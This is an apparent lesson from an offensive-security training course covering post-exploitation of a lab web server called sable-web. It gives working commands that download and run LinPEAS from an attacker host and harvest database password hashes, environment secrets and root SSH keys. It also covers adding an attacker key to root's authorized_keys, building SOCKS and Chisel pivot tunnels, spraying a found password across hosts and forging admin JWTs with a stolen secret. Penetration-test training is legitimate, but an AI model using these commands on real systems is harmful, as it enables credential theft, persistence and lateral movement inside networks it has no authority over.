---
title: "Phase 2 — Post-Web-Exploitation and Internal Network Discovery"
tags: [ghost-level, post-exploitation, pivoting, credential-harvesting,
  internal-recon, module-11-ghost-level]
module: 11-GhostLevel
day: 710
prerequisites:
  - Day 709 — Phase 2: Web App Exploitation
  - Day 523 — Lateral Movement Fundamentals
  - Day 495 — Post-Exploitation Basics
related_topics:
  - Day 711 — Phase 3: Network Service Enumeration
  - Day 715 — Phase 4: Pivoting and AD Recon
---

# Day 710 — Phase 2: Post-Web-Exploitation and Internal Network Discovery

> "You are on sable-web. That is not the target — that is the door.
> The question now is: what does this machine know? What does it see?
> What credentials does it hold? And most importantly: how do you get
> from here to everything else?"
>
> — Ghost

---

> **ENGAGEMENT CLOCK — CHECK IN**
> Time elapsed: _______ hours | Foothold: sable-web: Y / N

---

## Goals

From the foothold on `sable-web`, enumerate the local machine for
credentials, configuration files, and internal network visibility.
Set up a pivot tunnel to reach `sable-store` and other internal hosts.
Escalate privileges on `sable-web` if not already root.

**Target time:** Hours 12–15 (3 hours on this phase).

---

## 1 — Local Enumeration on sable-web

```bash
# ─── Assume shell obtained. Run enumeration script ────────────────────
# Upload LinPEAS for automated enumeration:
# On attacker: python3 -m http.server 8000
# On target:
wget http://10.0.2.10:8000/linpeas.sh -O /tmp/lpe.sh && bash /tmp/lpe.sh \
    | tee /tmp/lpe_out.txt
# Key sections to read: SUID, sudo, cron, env vars, passwords in config

# ─── Manual high-value targets ───────────────────────────────────────

# 1. Application config files (DB credentials, API keys)
find /var/www /opt /srv /app /home -name "*.env" -o -name "*.conf" \
     -o -name "config.js" -o -name "config.json" 2>/dev/null | head -20
cat /var/www/sable-web/.env 2>/dev/null
cat /app/config.js 2>/dev/null

# 2. Database credentials → connect to DB
# If PostgreSQL:
cat /etc/postgresql/*/main/pg_hba.conf 2>/dev/null
psql -h 127.0.0.1 -U sable_app -d sable_db 2>/dev/null <<'SQL'
SELECT usename, passwd FROM pg_shadow;
SELECT username, password_hash, email, role FROM users LIMIT 20;
SQL

# 3. Environment variables (running web process)
cat /proc/$(pgrep -f node || pgrep -f python || pgrep -f ruby)/environ \
    | tr '\0' '\n' | grep -iE "pass|key|secret|db|database"

# 4. SSH keys
find /root /home -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
cat /root/.ssh/id_rsa 2>/dev/null

# 5. Bash history
cat /root/.bash_history /home/*/.bash_history 2>/dev/null | \
    grep -iE "ssh|mysql|psql|password|curl.*[Aa]uthorization"
```

```
LOCAL ENUMERATION RESULTS

DB credentials found: Y / N
  Username: __________________ Password: _______________________
  DB type: ___________________

DB query results:
  User accounts in DB:
    admin: ______________________________________________________
    Other: ______________________________________________________

Environment variables of interest:
  _______________________________________________________________

SSH private keys: Y / N  (copy them — valuable for lateral movement)
  Key path: _____________________________________________________

Bash history findings:
  _______________________________________________________________

Application secrets found (API keys, JWT signing keys):
  _______________________________________________________________
```

---

## 2 — Privilege Escalation on sable-web

```bash
# Check current access
id && whoami && hostname

# SUID binaries
find / -perm -4000 -type f 2>/dev/null | tee /tmp/suid_list.txt
# Cross-reference with GTFOBins: https://gtfobins.github.io/

# Sudo permissions
sudo -l 2>/dev/null

# Cron jobs
cat /etc/crontab /var/spool/cron/crontabs/* 2>/dev/null
ls -la /etc/cron.d/ /etc/cron.hourly/ 2>/dev/null

# Writable files owned by root
find /etc /usr/local /opt -writable -type f 2>/dev/null | grep -v proc | head -20

# Running as www-data? Check writable web paths for PHP/CGI
# If the app uses Node.js — check for process spawning with shell:
ps aux | grep -E "node|npm|pm2"
```

```
PRIVILEGE ESCALATION

Current user: __________________________________________________
Target: root

Interesting SUID binaries: ______________________________________
Sudo permissions: _______________________________________________
Writeable cron path: ____________________________________________
PrivEsc method found: ___________________________________________

Root obtained: Y / N
Method: _________________________________________________________
Proof (id output): ______________________________________________
```

---

## 3 — Internal Network Visibility and Pivoting

```bash
# What can sable-web reach?
ip route
ip addr
# Note any additional network interfaces (VLANs, management net)

# Quick internal sweep from the compromised host
for ip in $(seq 1 60); do
    ping -c1 -W1 10.0.1.$ip &>/dev/null && echo "10.0.1.$ip alive" &
done; wait

# Try to reach sable-store (10.0.1.50) directly
nc -zv 10.0.1.50 21 445 2049

# ─── Set up pivot tunnel ──────────────────────────────────────────────
# Option A: SSH tunnel (if SSH is available and you have root/creds)
# Forward all of 10.0.1.0/24 through the sable-web shell

# On attacker: generate SSH key pair
ssh-keygen -t ed25519 -f /tmp/pivot_key -N ""
# Add attacker public key to target authorized_keys:
echo "$(cat /tmp/pivot_key.pub)" >> /root/.ssh/authorized_keys  # on target

# On attacker: open SOCKS proxy through sable-web
ssh -i /tmp/pivot_key -D 1080 -f -N root@10.0.1.10
# Configure proxychains to use 127.0.0.1:1080

# Option B: Chisel (binary tunnel over HTTP)
# On attacker: ./chisel server -p 8888 --reverse
# On target:   ./chisel client 10.0.2.10:8888 R:1080:socks
```

```
PIVOTING SETUP

Internal network interfaces on sable-web:
  eth0: 10.0.1.10  (known)
  eth1: __________________ (additional interface?)
  Other: ________________

Hosts reachable from sable-web:
  10.0.1.50 reachable: Y / N  Open ports: _____________________
  Other new hosts: ____________________________________________

Pivot method: SSH socks / Chisel / other: _______________________
Pivot tunnel active: Y / N
proxychains smbclient -L //10.0.1.50 works: Y / N
```

---

## 4 — Credential Reuse Across Services

```bash
# Test DB password from .env against other services
DB_PASS="<found_password>"

# sable-dc SMB
crackmapexec smb 10.0.1.30 -u "sable_app" -p "$DB_PASS"
crackmapexec smb 10.0.1.30 -u "Administrator" -p "$DB_PASS"

# sable-iot web panel
curl -sk -d "username=admin&password=$DB_PASS" http://10.0.1.40/login -I

# Found JWT signing key → forge any user's token
JWT_SECRET="<found_signing_key>"
python3 - << EOF
import jwt, json, time
secret = "$JWT_SECRET"
payload = {
    "sub": "admin",
    "role": "admin",
    "is_admin": True,
    "exp": int(time.time()) + 86400
}
token = jwt.encode(payload, secret, algorithm="HS256")
print(f"Forged admin token: {token}")
EOF
```

```
CREDENTIAL REUSE RESULTS

Credentials tested across services:
  sable-dc (SMB):    sable_app:______ → valid Y / N
  sable-iot (web):   admin:________ → valid Y / N
  Other:             _______________

JWT secret found: _________________ (if found in config)
Forged token works on /admin: Y / N
```

---

## Phase Summary

```
PHASE 2 COMPLETION CHECK

sable-web findings (list all):
  1. _______________________________________________________________
  2. _______________________________________________________________
  3. _______________________________________________________________

Access level obtained: user shell / root shell / no shell
Credentials harvested:
  DB:      ________________________
  SSH key: ________________________
  JWT key: ________________________
  Other:   ________________________

Pivot active to internal network: Y / N
sable-store reachable via pivot: Y / N

Time spent: _______ hours (target: ≤ 9 for web phases total)
Phase 2 complete: Y / N
```

---

## Navigation

← Previous: [Day 709 — Phase 2: Web App Exploitation](DAY-0709-Phase2-Web-App-Exploitation.md)
→ Next: [Day 711 — Phase 3: Network Service Enumeration (sable-svc)](DAY-0711-Phase3-Network-Service-Enum.md)
